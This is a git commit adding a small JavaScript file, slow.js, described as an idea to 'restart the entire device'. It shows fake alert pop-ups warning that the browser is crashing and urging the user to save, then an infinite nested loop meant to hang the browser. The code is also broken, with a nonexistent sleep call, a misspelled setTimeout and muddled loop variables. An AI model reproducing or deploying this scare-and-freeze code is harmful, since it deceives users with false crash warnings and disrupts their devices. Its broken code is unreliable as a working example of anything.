3882aa8d172543fea241e85621f0a07cd7ef8cd2
TST314 <44678673+TST314@users.noreply.github.com>
2019-11-23 13:28:55 -0500

    Create slow.js

---
+++ js/slow.js
@@ -0,0 +1,24 @@
+/*
+A js idea to restart the entire device on plug in
+*/
+sleep(60000); //waits 1 minute
+asetTimeout(function(){ alert("This browser is currenlty undergoing a browser based error"); }, 6000);
+setTimeout(function(){ alert("This may cause crashing of computer. Please save "); }, 5000);
+sleep(3000);
+setTimeout(function(){alert("Browser currently crashing");}, 5000);
+sleep(2000);
+//SE end
+//Breaker Start
+
+let x = 3
+let y = 3
+while (x = y) {
+    var e
+    for (var e = 1; e < 10000000000000000000; i += 1) {
+        var i
+        for (var i = 1; i < 1000; i += 1) {
+            console.log(i);
+        }
+    }
+}
+
